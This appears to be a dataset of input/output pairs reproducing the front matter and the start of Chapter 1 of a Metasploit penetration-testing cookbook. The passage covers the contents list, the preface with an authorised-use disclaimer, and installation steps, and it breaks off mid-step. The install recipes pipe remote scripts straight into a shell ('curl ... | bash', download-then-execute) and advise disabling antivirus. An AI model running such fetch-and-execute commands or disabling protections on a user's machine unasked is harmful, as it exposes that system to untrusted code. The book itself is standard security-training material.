[
  {
    "input": "Cover\r",
    "output": "Metasploit Penetration Testing\nCookbook\nThird Edition\nEvade antiviruses, bypass firewalls, and exploit complex\nenvironments with the most widely used penetration\ntesting framework\nDaniel Teixeira\nAbhinav Singh\nMonika Agarwal\nBIRMINGHAM - MUMBAI"
  },
  {
    "input": "Copyright and Credits",
    "output": "Metasploit Penetration Testing Cookbook\nThird Edition\nCopyright © 2018 Packt Publishing\nAll rights reserved. No part of this book may be reproduced, stored in a retrieval system, or transmitted in any form\nor by any means, without the prior written permission of the publisher, except in the case of brief quotations\nembedded in critical articles or reviews.\nEvery effort has been made in the preparation of this book to ensure the accuracy of the information presented.\nHowever, the information contained in this book is sold without warranty, either express or implied. Neither the\nauthors, nor Packt Publishing or its dealers and distributors, will be held liable for any damages caused or alleged to\nhave been caused directly or indirectly by this book.\nPackt Publishing has endeavored to provide trademark information about all of the companies and products\nmentioned in this book by the appropriate use of capitals. However, Packt Publishing cannot guarantee the accuracy\nof this information.\nCommissioning Editor: Vijin Boricha\nAcquisition Editor: Meeta Rajani\nContent Development Editor: Abhishek Jadhav\nTechnical Editor: Aditya Khadye\nCopy Editor: Safis Editing, Dipti Mankame\nProject Coordinator: Judie Jose\nProofreader: Safis Editing\nIndexer: Aishwarya Gangawane, Mariammal Chettiyar\nGraphics: Tom Scaria\nProduction Coordinator: Aparna Bhagat\nFirst published: June 2012\nSecond edition: October 2013\nThird edition: February 2018\nProduction reference: 1220218\nPublished by Packt Publishing Ltd.\nLivery Place\n35 Livery Street\nBirmingham\nB3 2PB, UK.\nISBN 978-1-78862-317-9\nwww.packtpub.com"
  },
  {
    "input": "Contributors",
    "output": "Contributors\nAbout the authors\nDaniel Teixeira is an IT security expert, author, and trainer, specializing in red team\nengagements, penetration testing, and vulnerability assessments. His main areas of focus\nare adversary simulation, emulation of modern adversarial tactics, techniques and\nprocedures; vulnerability research, and exploit development.\nTo my wife and daughter for their continued support, patience, and encouragement, and to\nmy parents, for without them, none of this would have been possible.\nAbhinav Singh is a well-known information security researcher. He is the author of\nMetasploit Penetration Testing Cookbook (first and second editions) and Instant Wireshark\nStarter, by Packt. He is an active contributor to the security community—paper publications,\narticles, and blogs. His work has been quoted in several security and privacy magazines,\nand digital portals. He is a frequent speaker at eminent international conferences—Black\nHat and RSA. His areas of expertise include malware research, reverse engineering,\nenterprise security, forensics, and cloud security.\nI'd like to thank my grandparents for their blessings and my parents for their constant\nsupport—without them, nothing would've been possible in this world. I'd like to thank my\nsister for being my doctor and taking care of my fatigue level; my wife for being my\nconstant timekeeper and a patient listener; Manchester United for teaching me the value of\nhard work; and Packt for helping me reach a major career milestone.\nMonika Agarwal is a young Information Security Researcher from India. She has presented\nmany research papers at both national and international conferences. She is a member of\nIAENG (International Association of Engineers). Her main areas of interest are ethical\nhacking and ad hoc networking.\nI would like to thank my parents, my husband, Nikhil, and give special thanks to my\nfather-in-law and mother-in-law for always being so supportive. And last but not the least,\nPackt, for giving me this opportunity.\nPackt is searching for authors like you\nIf you're interested in becoming an author for Packt, please visit authors.packtpub.com and\napply today. We have worked with thousands of developers and tech professionals, just\nlike you, to help them share their insight with the global tech community. You can make a\ngeneral application, apply for a specific hot topic that we are recruiting an author for, or\nsubmit your own idea."
  },
  {
    "input": "Packt Upsell",
    "output": "mapt.io\nMapt is an online digital library that gives you full access to over 5,000 books and videos, as\nwell as industry leading tools to help you plan your personal development and advance\nyour career. For more information, please visit our website.\nWhy subscribe?\nSpend less time learning and more time coding with practical eBooks and Videos\nfrom over 4,000 industry professionals\nImprove your learning with Skill Plans built especially for you\nGet a free eBook or video every month\nMapt is fully searchable\nCopy and paste, print, and bookmark content\nPacktPub.com\nDid you know that Packt offers eBook versions of every book published, with PDF and\nePub files available? You can upgrade to the eBook version at www.PacktPub.com and as a\nprint book customer, you are entitled to a discount on the eBook copy. Get in touch with us\nat service@packtpub.com for more details.\nAt www.PacktPub.com, you can also read a collection of free technical articles, sign up for a\nrange of free newsletters, and receive exclusive discounts and offers on Packt books and\neBooks."
  },
  {
    "input": "Table of Contents",
    "output": "Table of Contents\nPreface 1\nChapter 1: Metasploit Quick Tips for Security Professionals 7\nIntroduction 8\nInstalling Metasploit on Windows 10\nGetting ready 10\nHow to do it... 11\nInstalling Linux and macOS 11\nHow to do it... 12\nInstalling Metasploit on macOS 13\nHow to do it... 13\nUsing Metasploit in Kali Linux 14\nGetting ready 14\nHow to do it... 15\nThere's more... 17\nUpgrading Kali Linux 17\nSetting up a penetration-testing lab 18\nGetting ready 18\nHow to do it... 19\nHow it works... 23\nSetting up SSH connectivity 23\nGetting ready 23\nHow to do it... 23\nConnecting to Kali using SSH 24\nHow to do it... 25\nConfiguring PostgreSQL 26\nGetting ready 26\nHow to do it... 26\nThere's more... 28\nCreating workspaces 29\nHow to do it... 29\nTable of Contents\nUsing the database 30\nGetting ready 30\nHow to do it... 31\nUsing the hosts command 32\nHow to do it... 32\nUnderstanding the services command 34\nHow to do it... 35\nChapter 2: Information Gathering and Scanning 38\nIntroduction 39\nPassive information gathering with Metasploit 40\nGetting ready 40\nHow to do it... 41\nDNS Record Scanner and Enumerator 41\nThere's more... 42\nCorpWatch Company Name Information Search 42\nSearch Engine Subdomains Collector 43\nCensys Search 44\nShodan Search 45\nShodan Honeyscore Client 46\nSearch Engine Domain Email Address Collector 46\nActive information gathering with Metasploit 47\nHow to do it... 47\nTCP Port Scanner 48\nTCP SYN Port Scanner 49\nPort scanning—the Nmap way 50\nGetting ready 50\nHow to do it... 50\nHow it works... 52\nThere's more... 53\nOperating system and version detection 53\nIncreasing anonymity 55\nPort scanning—the db_nmap way 55\nGetting ready 55\nHow to do it... 56\nNmap Scripting Engine 56\nHost discovery with ARP Sweep 57\n[ ii ]\nTable of Contents\nGetting ready 57\nHow to do it... 58\nUDP Service Sweeper 59\nHow to do it... 59\nSMB scanning and enumeration 60\nHow to do it... 60\nDetecting SSH versions with the SSH Version Scanner 63\nGetting ready 64\nHow to do it... 64\nFTP scanning 65\nGetting ready 65\nHow to do it... 66\nSMTP enumeration 66\nGetting ready 67\nHow to do it... 67\nSNMP enumeration 67\nGetting ready 68\nHow to do it... 68\nHTTP scanning 69\nGetting ready 69\nHow to do it... 70\nWinRM scanning and brute forcing 72\nGetting ready 72\nHow to do it... 72\nIntegrating with Nessus 73\nGetting ready 74\nHow to do it... 75\nIntegrating with NeXpose 80\nGetting ready 80\nHow to do it... 81\nIntegrating with OpenVAS 82\nHow to do it... 82\nChapter 3: Server-Side Exploitation 88\nIntroduction 88\nGetting to know MSFconsole 90\n[ iii ]\nTable of Contents\nMSFconsole commands 90\nExploiting a Linux server 91\nGetting ready 92\nHow to do it... 93\nHow it works... 96\nWhat about the payload? 96\nSQL injection 98\nGetting ready 98\nHow to do it... 99\nTypes of shell 100\nGetting ready 101\nHow to do it... 101\nExploiting a Windows Server machine 104\nGetting ready 104\nHow to do it... 105\nExploiting common services 110\nGetting ready 110\nHow to do it 110\nMS17-010 EternalBlue SMB Remote Windows Kernel Pool\nCorruption 111\nGetting ready 112\nHow to do it... 112\nMS17-010 EternalRomance/EternalSynergy/EternalChampion 113\nHow to do it... 113\nInstalling backdoors 114\nGetting ready 114\nHow to do it... 114\nDenial of Service 119\nGetting ready 120\nHow to do it... 120\nHow to do it... 122\nChapter 4: Meterpreter 123\nIntroduction 124\nUnderstanding the Meterpreter core commands 125\nGetting ready 126\n[ iv ]\nTable of Contents\nHow to do it... 126\nHow it works... 129\nUnderstanding the Meterpreter filesystem commands 130\nHow to do it... 130\nHow it works... 132\nUnderstanding Meterpreter networking commands 133\nGetting ready 133\nHow to do it... 134\nHow it works... 137\nUnderstanding the Meterpreter system commands 138\nHow to do it... 138\nSetting up multiple communication channels with the target 142\nGetting ready 143\nHow to do it... 143\nHow it works... 145\nMeterpreter anti-forensics 145\nGetting ready 146\nHow to do it... 147\nHow it works... 147\nThere's more... 148\nThe getdesktop and keystroke sniffing 148\nGetting ready 148\nHow to do it... 149\nThere's more... 152\nUsing a scraper Meterpreter script 153\nGetting ready 154\nHow to do it... 154\nHow it works... 154\nScraping the system using winenum 155\nHow to do it... 155\nAutomation with AutoRunScript 156\nHow to do it... 156\nMeterpreter resource scripts 158\nHow to do it... 158\nMeterpreter timeout control 160\n[ v ]\nTable of Contents\nHow to do it... 160\nMeterpreter sleep control 161\nHow to do it... 161\nMeterpreter transports 162\nHow to do it... 162\nInteracting with the registry 165\nGetting ready 165\nHow to do it... 166\nLoading framework plugins 169\nHow to do it... 169\nMeterpreter API and mixins 173\nGetting ready 173\nHow to do it... 173\nHow it works... 174\nRailgun—converting Ruby into a weapon 175\nGetting ready 176\nHow to do it... 176\nHow it works... 177\nThere's more... 177\nAdding DLL and function definitions to Railgun 177\nHow to do it... 178\nHow it works... 179\nInjecting the VNC server remotely 180\nGetting ready 180\nHow to do it... 181\nEnabling Remote Desktop 182\nHow to do it... 182\nHow it works... 185\nChapter 5: Post-Exploitation 187\nIntroduction 188\nPost-exploitation modules 188\nGetting ready 188\nHow to do it... 189\nHow it works... 190\nHow to do it... 191\n[ vi ]\nTable of Contents\nHow it works... 192\nBypassing UAC 193\nGetting ready 193\nHow to do it... 197\nDumping the contents of the SAM database 198\nGetting ready 198\nHow to do it... 198\nPassing the hash 200\nHow to do it... 200\nIncognito attacks with Meterpreter 201\nHow to do it... 201\nUsing Mimikatz 203\nGetting ready 203\nHow to do it... 204\nThere's more... 208\nSetting up a persistence with backdoors 208\nGetting ready 208\nHow to do it... 208\nBecoming TrustedInstaller 210\nHow to do it... 211\nBackdooring Windows binaries 212\nHow to do it... 213\nPivoting with Meterpreter 215\nGetting ready 215\nHow to do it... 217\nHow it works... 219\nPort forwarding with Meterpreter 221\nGetting ready 221\nHow to do it... 222\nCredential harvesting 224\nHow to do it... 224\nEnumeration modules 225\nHow to do it... 226\nAutoroute and socks proxy server 228\nHow to do it... 229\n[ vii ]\nTable of Contents\nAnalyzing an existing post-exploitation module 231\nGetting ready 231\nHow to do it... 231\nHow it works... 233\nWriting a post-exploitation module 234\nGetting ready 234\nHow to do it... 235\nChapter 6: Using MSFvenom 237\nIntroduction 237\nPayloads and payload options 238\nGetting ready 238\nHow to do it... 238\nEncoders 244\nHow to do it... 245\nThere's more... 249\nOutput formats 250\nHow to do it... 250\nTemplates 254\nGetting ready 254\nHow to do it... 254\nMeterpreter payloads with trusted certificates 256\nGetting ready 256\nHow to do it... 256\nThere's more... 259\nChapter 7: Client-Side Exploitation and Antivirus Bypass 261\nIntroduction 261\nExploiting a Windows 10 machine 262\nGetting ready 262\nHow to do it... 262\nBypassing antivirus and IDS/IPS 264\nHow to do it... 264\nMetasploit macro exploits 266\nHow to do it... 266\nThere's more... 269\n[ viii ]\nTable of Contents\nHuman Interface Device attacks 269\nGetting ready 270\nHow to do it... 270\nHTA attack 271\nHow to do it... 272\nBackdooring executables using a MITM attack 273\nGetting ready 273\nHow to do it... 275\nCreating a Linux trojan 278\nHow to do it... 278\nCreating an Android backdoor 281\nGetting ready 282\nHow to do it... 283\nThere's more... 287\nChapter 8: Social-Engineer Toolkit 288\nIntroduction 288\nGetting started with the Social-Engineer Toolkit 288\nGetting ready 289\nHow to do it... 289\nHow it works... 290\nWorking with the spear-phishing attack vector 290\nHow to do it... 291\nWebsite attack vectors 294\nHow to do it... 295\nWorking with the multi-attack web method 298\nHow to do it... 299\nInfectious media generator 299\nHow to do it... 300\nHow it works... 300\nChapter 9: Working with Modules for Penetration Testing 301\nIntroduction 301\nWorking with auxiliary modules 301\nGetting ready 302\nHow to do it... 302\n[ ix ]\nTable of Contents\nDoS attack modules 304\nHow to do it... 304\nHTTP 304\nSMB 305\nPost-exploitation modules 307\nGetting ready 307\nHow to do it... 307\nUnderstanding the basics of module building 309\nHow to do it... 309\nAnalyzing an existing module 311\nGetting ready 311\nHow to do it... 311\nBuilding your own post-exploitation module 312\nGetting ready 312\nHow to do it... 313\nBuilding your own auxiliary module 316\nGetting ready 316\nHow to do it... 316\nChapter 10: Exploring Exploits 321\nIntroduction 321\nCommon exploit mixins 322\nHow to do it... 322\nExploiting the module structure 323\nGetting ready 324\nHow to do it... 324\nHow it works... 325\nUsing MSFvenom to generate shellcode 326\nGetting ready 326\nHow to do it... 327\nConverting an exploit to a Metasploit module 329\nGetting ready 329\nHow to do it... 331\nPorting and testing the new exploit module 332\nGetting ready 333\nHow to do it... 333\n[ x ]\nTable of Contents\nFuzzing with Metasploit 334\nGetting ready 334\nHow to do it... 334\nWriting a simple fuzzer 336\nHow to do it... 336\nHow it works... 338\nChapter 11: Wireless Network Penetration Testing 340\nIntroduction 340\nGetting ready 340\nMetasploit and wireless 341\nHow to do it... 341\nUnderstanding an evil twin attack 344\nGetting ready 344\nHow to do it... 344\nConfiguring Karmetasploit 346\nGetting ready 347\nHow to do it... 347\nWireless MITM attacks 349\nGetting ready 350\nHow to do it... 350\nSMB relay attacks 353\nHow to do it... 353\nThere's more... 356\nChapter 12: Cloud Penetration Testing 359\nIntroduction 359\nMetasploit in the cloud 360\nGetting ready 361\nHow to do it... 364\nThere's more... 366\nMetasploit PHP Hop 370\nGetting ready 370\nHow to do it... 370\nPhishing from the cloud 371\nGetting ready 371\n[ xi ]\nTable of Contents\nHow to do it... 373\nSetting up a cloud penetration testing lab 376\nHow to do it... 376\nThere's more... 377\nChapter 13: Best Practices 378\nIntroduction 378\nBest practices 378\nHow to do it... 379\nGuided partitioning with encrypted LVM 380\nUsing Metasploit over the Tor network 380\nGetting ready 381\nHow to do it... 382\nMetasploit logging 383\nHow to do it... 383\nThere's more... 386\nDocumentation 386\nHow to do it... 387\nCleaning up 388\nHow to do it... 388\nOther Books You May Enjoy 390\nIndex 393\n[ xii ]"
  },
  {
    "input": "Preface",
    "output": "Preface\nWelcome to Metasploit Penetration Testing Cookbook, Third Edition. This book covers various\nrecipes of performing penetration testing over different platforms using the Metasploit\nFramework.\nThe book will guide you on how to perform a penetration test using the Metasploit\nFramework and following the penetration testing execution standard (PTES). Starting with\nthe basics of information gathering using several auxiliary modules that help you profile\nyour target and gradually introducing you to advanced topics, such as porting exploits and\nbuilding your modules, it will show you how to build a penetration test lab environment,\nwhere you will learn how to find vulnerabilities by enumerating and scanning the different\ntargets with Metasploit, how to exploit targets using server-side vulnerabilities, and how to\nmaster Meterpreter capabilities while performing post-exploitation.\nYou will use MSFvenom with custom encoders and trusted certificates to evade anti-virus\nsolutions, bypass firewalls, and compromise secure networks. This book will show you why\nclient-side attacks are the number one method to compromise organizations and how to use\nMetasploit to mimic the same tactics and techniques used by advanced adversaries. You\nwill learn how to work with modules, build your own modules, add exploits to the\nMetasploit Framework, and leverage Metasploit while performing wireless and cloud-\nbased penetration tests. It will take your penetration skills to the next level by showing you\nhow to think and act like the adversary using the most advanced penetration testing\nframework in the world.\nWho this book is for\nThis book targets both professional penetration testers and new users of Metasploit who\nwish to gain expertise on the framework. The book requires basic knowledge of Ruby.\nPreface\nWhat this book covers\nChapter 1, Metasploit Quick Tips for Security Professionals, contains recipes covering how to\ninstall Metasploit on different platforms, building a penetration testing lab, configuring\nMetasploit to use a PostgreSQL database, and using workspaces.\nChapter 2, Information Gathering and Scanning, discusses passive and active information\ngathering with Metasploit, port scanning, scanning techniques, enumeration,\nand integration with scanners such as Nessus, NeXpose, and OpenVAS.\nChapter 3, Server-Side Exploitation, includes Linux and Windows server exploitation, SQL\ninjection, backdoor installation, and Denial of Service attacks.\nChapter 4, Meterpreter, covers all of the commands related to Meterpreter, communication\nchannels, keyloggers, automation, loading framework plugins, using Railgun, and much\nmore.\nChapter 5, Post-Exploitation, covers post-exploitation modules, privilege escalation, process\nmigration, bypassing UAC, pass the hash attacks, using Incognito and Mimikatz,\nbackdooring Windows binaries, pivoting, port forwarding, credential harvesting, and\nwriting a post-exploitation module.\nChapter 6, Using MSFvenom, discusses MSFvenom payloads and payload options,\nencoders, output formats, templates, and how to use Meterpreter payloads with trusted\ncertificates.\nChapter 7, Client-Side Exploitation and Antivirus Bypass, explains how to exploit a Windows\n10 machine, antivirus and IDS/IPS bypasses, macro exploits, Human Interface Device\nattacks, HTA attacks, how to backdoor executables using a MITM attack, and how to create\na Linux trojan and an Android backdoor.\nChapter 8, Social-Engineer Toolkit, includes how to get started with the Social-Engineer\nToolkit, spear-phishing attack vectors, website attack vectors, working with the multiattack\nweb method, and infectious media generation.\nChapter 9, Working with Modules for Penetration Testing, covers auxiliary modules, DoS\nattack modules, post-exploitation modules, and module analyzing and building.\nChapter 10, Exploring Exploits, covers common exploit mixins, generating shellcode with\nMSFvenom, converting exploits to Metasploit modules, fuzzing with Metasploit, and how\nto write a simple fuzzer.\n[ 2 ]\nPreface\nChapter 11, Wireless Network Penetration Testing, Metasploit and wireless, includes evil twin\nattacks, Karmetasploit, wireless MITM attacks, and SMB relay attacks.\nChapter 12, Cloud Penetration Testing, covers how to use Metasploit in the cloud, Metasploit\nPHP Hop, performing phishing attacks from the cloud, and setting up a cloud penetration\ntesting lab.\nChapter 13, Best Practices, includes using Metasploit over the Tor network, Metasploit\nlogging, documentation, and cleaning up.\nTo get the most out of this book\nTo perform the various recipes mentioned in this book, you will need the following:\nA Kali Linux machine\nA Metasploitable 2 vulnerable machine\nA Metasploitable 3 vulnerable machine\nA Windows 7 x86 client machine\nA Windows 10 client machine\nAn Android OS device or a virtual machine\nMost of the software mentioned in the book can be found in Kali Linux or is\navailable for download at the links mentioned in the book\nDownload the color images\nWe also provide a PDF file that has color images of the screenshots/diagrams used in this\nbook. You can download it here: https:/​/​www.​packtpub.​com/​sites/​default/​files/\ndownloads/​MetasploitPenetrationTestingCookbookThirdEdition_​ColorImages.​pdf.\nConventions used\nThere are a number of text conventions used throughout this book.\nCodeInText: Indicates code words in text, database table names, folder names, filenames,\nfile extensions, pathnames, dummy URLs, user input, and Twitter handles. Here is an\nexample: \"Mount the downloaded WebStorm-10*.dmg disk image file as another disk in\nyour system.\"\n[ 3 ]\nPreface\nA block of code is set as follows:\nclass MetasploitModule < Msf::Post\ninclude Msf::Post::Windows::WMIC\ndef initialize(info={})\nsuper( update_info( info,\n'Name' => 'Windows Gather Run Specified WMIC Command',\nAny command-line input or output is written as follows:\nroot@kali:~# passwd\nBold: Indicates a new term, an important word, or words that you see onscreen. For\nexample, words in menus or dialog boxes appear in the text like this. Here is an example:\n\"In VMware Fusion, go to Preferences, select the Network tab, and create a custom\nnetwork.\"\nWarnings or important notes appear like this.\nTips and tricks appear like this.\nSections\nIn this book, you will find several headings that appear frequently (Getting ready, How to do\nit..., How it works..., and There's more...).\nTo give clear instructions on how to complete a recipe, use these sections as follows:\nGetting ready\nThis section tells you what to expect in the recipe and describes how to set up any software\nor any preliminary settings required for the recipe.\n[ 4 ]\nPreface\nHow to do it…\nThis section contains the steps required to follow the recipe.\nHow it works…\nThis section usually consists of a detailed explanation of what happened in the previous\nsection.\nThere's more…\nThis section consists of additional information about the recipe in order to make you more\nknowledgeable about the recipe.\nGet in touch\nFeedback from our readers is always welcome.\nGeneral feedback: Email feedback@packtpub.com and mention the book title in the\nsubject of your message. If you have questions about any aspect of this book, please email\nus at questions@packtpub.com.\nErrata: Although we have taken every care to ensure the accuracy of our content, mistakes\ndo happen. If you have found a mistake in this book, we would be grateful if you would\nreport this to us. Please visit www.packtpub.com/submit-errata, selecting your book,\nclicking on the Errata Submission Form link, and entering the details.\nPiracy: If you come across any illegal copies of our works in any form on the internet, we\nwould be grateful if you would provide us with the location address or website name.\nPlease contact us at copyright@packtpub.com with a link to the material.\nIf you are interested in becoming an author: If there is a topic that you have expertise in\nand you are interested in either writing or contributing to a book, please visit\nauthors.packtpub.com.\n[ 5 ]\nPreface\nReviews\nPlease leave a review. Once you have read and used this book, why not leave a review on\nthe site that you purchased it from? Potential readers can then see and use your unbiased\nopinion to make purchase decisions, we at Packt can understand what you think about our\nproducts, and our authors can see your feedback on their book. Thank you!\nFor more information about Packt, please visit packtpub.com.\nDisclaimer\nThe information within this book is intended to be used only in an ethical manner. Do not\nuse any information from the book if you do not have written permission from the owner of\nthe equipment. If you perform illegal actions, you are likely to be arrested and prosecuted\nto the full extent of the law. Packt Publishing does not take any responsibility if you misuse\nany of the information contained within the book. The information herein must only be\nused while testing environments with proper written authorizations from appropriate\npersons responsible.\n[ 6 ]"
  },
  {
    "input": "Chapter 1: Metasploit Quick Tips for Security Professionals",
    "output": "1\nMetasploit Quick Tips for\nSecurity Professionals\nIn this chapter, we will cover the following recipes:\nInstalling Metasploit on Windows\nInstalling Linux and macOS\nInstalling Metasploit on macOS\nUsing Metasploit in Kali Linux\nSetting up a penetration testing lab using VMware\nSetting up SSH connectivity\nConnecting to Kali using SSH\nConfiguring Metasploit to use PostgreSQL\nCreating workspaces\nUsing the database\nUsing the hosts command\nUnderstanding the services command"
  },
  {
    "input": "Introduction",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nIntroduction\nMetasploit is currently the world's leading penetration-testing tool, and one of the biggest\nopen-source projects in information security and penetration testing. It has totally\nrevolutionized the way we can perform security tests on our systems. The reason\nMetasploit is so popular is the wide range of tasks that it can perform to ease the work of\npenetration testing to make systems more secure. Metasploit is available for all popular\noperating systems. The working process of the framework is almost the same for all of\nthem. In this book, we will primarily work on Kali Linux as it comes with the preinstalled\nMetasploit Framework and other third-party tools which run over the framework.\nLet's proceed with a quick introduction to the framework and the various terminologies\nrelated to it:\nMetasploit Framework: This is a free, open-source penetration-testing\nframework started by H. D. Moore in 2003, which was later acquired by Rapid7.\nThe current stable versions of the framework are written using the Ruby\nlanguage. It has the world's largest database of tested exploits and receives more\nthan a million downloads every year. It is also one of the most complex projects\nbuilt in Ruby to date.\nVulnerability: This is a weakness which allows an attacker/pentester to break\ninto or compromise a system's security. This weakness can exist in the operating\nsystem, the application software, or even in the network protocols.\nExploit: An exploit is a piece of code which allows an attacker/tester to take\nadvantage of the vulnerable system and compromise its security. Every\nvulnerability has its own corresponding exploit. Metasploit has more than 1,700\nexploits.\nPayload: This is the actual code which does the work. It runs on the system after\nexploitation. It is mostly used to set up a connection between the attacking and\nvictim machines. Metasploit has more than 500 payloads.\nModule: Modules are the small building blocks of a complete system. Every\nmodule performs a specific task and a complete system is built by combining\nseveral modules to function as a single unit. The biggest advantage of such an\narchitecture is that it becomes easy for developers to integrate new exploit code\nand tools into the framework.\n[ 8 ]\nMetasploit Quick Tips for Security Professionals Chapter 1\nThe Metasploit Framework has a modular architecture and the exploits, payload, encoders,\nand so on are considered to be separate modules:\nLet's examine the architecture diagram closely.\nMetasploit uses different libraries that hold the key to the proper functioning of the\nframework. These libraries are a collection of predefined tasks, operations, and functions\nthat can be utilized by different modules of the framework. The most fundamental part of\nthe framework is the Ruby extension (Rex) library. Some of the components provided by\nRex include a wrapper socket subsystem, implementations of protocol clients and servers, a\nlogging subsystem, exploitation utility classes, and a number of other useful classes. Rex\nitself is designed to have no dependencies, other than what comes with the default Ruby\ninstallation.\nThen we have the MSF Core library that extends Rex. Core is responsible for implementing\nall of the required interfaces that allow for interacting with exploit modules, sessions, and\nplugins. This core library is extended by the framework base library, which is designed to\nprovide simpler wrapper routines for dealing with the framework core, as well as\nproviding utility classes for dealing with different aspects of the framework, such as\nserializing a module state to different output formats. Finally, the base library is extended\nby the framework's user interface (UI) that implements support for the different types of\nUIs to the framework itself, such as the command console and the web interface.\nThere are two different UIs provided with the framework, namely msfconsole and a web\ninterface. Checking out bought interfaces is highly recommended but, in this book, we will\nprimarily work on the msfconsole interface. This is because msfconsole provides the best\nsupport to the framework, leveraging all of the functionalities.\n[ 9 ]"
  },
  {
    "input": "Getting ready",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nThe msfconsole interface is by far the most talked-about part of the Metasploit\nFramework, and for good reason, as it is one of the most flexible, character-rich, and well-\nsupported tools within the framework. It actually provides a handy all-in-one interface for\nevery choice and setting attainable in the framework; it's like a one-stop shop for all of your\npen-testing dreams. We can use msfconsole to do anything, including launching an\nexploit, loading an auxiliary, executing enumeration, producing listeners, or executing mass\nexploitations in contrast to an entire network.\nA web interface is available for you to work with Metasploit Community, Express, and Pro.\nTo launch the web interface, open a web browser and go to https://localhost:3790.\nTo see the operating systems that are currently supported and the\nminimum system requirements, please visit https:/​/​www.​rapid7.​com/\nproducts/​metasploit/​system-​requirements.\nInstalling Metasploit on Windows\nInstallation of the Metasploit Framework on Windows is simple and requires almost no\neffort. The framework installer can be downloaded from the Metasploit official website\n(http:/​/​www.​metasploit.​com/​download). In this recipe, we will learn how to configure\nMetasploit on Windows.\nGetting ready\nYou will notice that there are four editions of Metasploit available:\nPro: For penetration testers and IT security teams\nExpress: For IT generalists at SMBs\nCommunity: For small companies and students\nFramework: For developers and security researchers\nTo follow along with this book, it is recommended to download the latest framework\nedition of Metasploit (https:/​/​windows.​metasploit.​com/​metasploitframework-​latest.\nmsi), which contains the console and all other relevant dependencies.\n[ 10 ]"
  },
  {
    "input": "Installing Linux and macOS",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nHow to do it...\nOnce you have completed downloading the installer, simply run it and sit back. It will\nautomatically install all the relevant components. Once the installation is complete, you can\naccess the framework through various shortcuts created by the installer:\nWhile installing Metasploit on Windows, you should disable the antivirus\nprotection, as it may detect some of the installation files as potential\nviruses or threats and can block the installation process. Once the\ninstallation is complete, make sure that you have white-listed the\nframework installation directory in your antivirus software, as it will\ndetect the exploits and payloads as malicious.\nInstalling Linux and macOS\nThe quick installation script will import the Rapid7 signing key and set up the package for\nall supported Linux and macOS systems:\ncurl\nhttps://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/t\nemplates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod\n755 msfinstall && ./msfinstall\n[ 11 ]"
  },
  {
    "input": "How to do it...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nThe packages will integrate into the OS's native package management and can either be\nupdated with the msfupdate command or by using your preferred package manager.\nHow to do it...\nThe full installation process is as follows:\n# curl\nhttps://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/t\nemplates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \\\n> chmod 755 msfinstall && \\\n> ./msfinstall\n% Total % Received % Xferd Average Speed Time Time Time Current\nDload Upload Total Spent Left Speed\n100 5394 100 5394 0 0 17618 0 --:--:-- --:--:-- --:--:-- 17627\nUpdating package cache..OK\nChecking for and installing update..\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following NEW packages will be installed:\nmetasploit-framework\n...\nRun msfconsole to get started\nW: --force-yes is deprecated, use one of the options starting with --allow\ninstead.\n# msfconsole\n# cowsay++\n____________\n< metasploit >\n------------\n\\ ,__,\n\\ (oo)____\n(__) )\\\n||--|| *\n...\nmsf >\n[ 12 ]"
  },
  {
    "input": "How to do it...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nInstalling Metasploit on macOS\nThe latest macOS installer package is available at https:/​/​osx.​metasploit.​com/\nmetasploitframework-​latest.​pkg.\nHow to do it...\nDownload and launch the installer to install Metasploit Framework with all of its\ndependencies. Once installed, you can launch msfconsole as /opt/metasploit-\nframework/bin/msfconsole:\n[ 13 ]"
  },
  {
    "input": "Getting ready",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nThe Metasploit Framework initial setup will help you set up a database and add Metasploit\nto your local PATH as shown:\n$ /opt/metasploit-framework/bin/msfconsole\n** Welcome to Metasploit Framework Initial Setup **\nPlease answer a few questions to get started.\nWould you like to add msfconsole and other programs to your default PATH?\nyes\nYou may need to start a new terminal or log in again for this to take\neffect.\nWould you like to use and setup a new database (recommended)? yes\nCreating database at /Users/user/.msf4/db\nStarting database at /Users/user/.msf4/db...success\nCreating database users\nCreating initial database schema\n** Metasploit Framework Initial Setup Complete *\nUsing Metasploit in Kali Linux\nKali Linux is the most popular operating system for security professionals for two reasons.\nFirst, it has all the popular penetration-testing tools preinstalled in it, so it reduces the cost\nof a separate installation. Secondly, it is a Linux-based operating system, which makes it\nless prone to virus attacks and provides more stability during penetration testing. It saves\nyou time as you don't have to install the relevant components and tools, and who knows\nwhen you may encounter an unknown error during the installation process.\nGetting ready\nEither you can have a separate installation of Kali Linux on your hard disk, or you can also\nuse it over a host on a virtual machine. The installation process is simple and the same as\ninstalling any Linux-based operating system.\n[ 14 ]"
  },
  {
    "input": "How to do it...",
    "output": "Metasploit Quick Tips for Security Professionals Chapter 1\nTo set up a Metasploit development environment on Kali Linux or any Debian-based Linux\nenvironment, you can use the following commands:\nsudo apt update\nsudo apt -y install autoconf bison build-essential curl git-core libapr1\nlibaprutil1 libcurl4-openssl-dev libgmp3-dev libpcap-dev libpq-dev\nlibreadline6-dev libsqlite3-dev libssl-dev libsvn1 libtool libxml2 libxml2-\ndev libxslt-dev libyaml-dev locate ncurses-dev openssl postgresql\npostgresql-contrib wget xsel zlib1g zlib1g-dev\ncurl -sSL https://rvm.io/mpapis.asc | gpg --import -\ncurl -L https://get.rvm.io | bash -s stable\nsource ~/.rvm/scripts/rvm\ncd /opt\nsudo git clone https://github.com/rapid7/metasploit-framework.git\nsudo chown -R `whoami` /opt/metasploit-framework\ncd metasploit-framework\nrvm --install $(cat .ruby-version)\ngem install bundler\nbundle install\nHow to do it...\nYou can download Kali Linux ISO images from the official site, https:/​/​www.​kali.​org/\ndownloads/​, create a bootable USB drive, or burn the ISO image to a DVD-ROM and use it\nto install Kali Linux as a separate OS on your hard disk or simply boot the Kali ISO image in\nLive Mode. Another way is to run Kali Linux inside a virtual machine; for that, you can\neither use the ISO image to install Kali Linux from scratch or just download a Kali Linux\nVMware, VirtualBox, or ARM image from the official site.\nFor this book, we will use a Kali Linux VMware virtual machine:\n1. When booting the Kali Linux virtual machine, you will be asked to enter 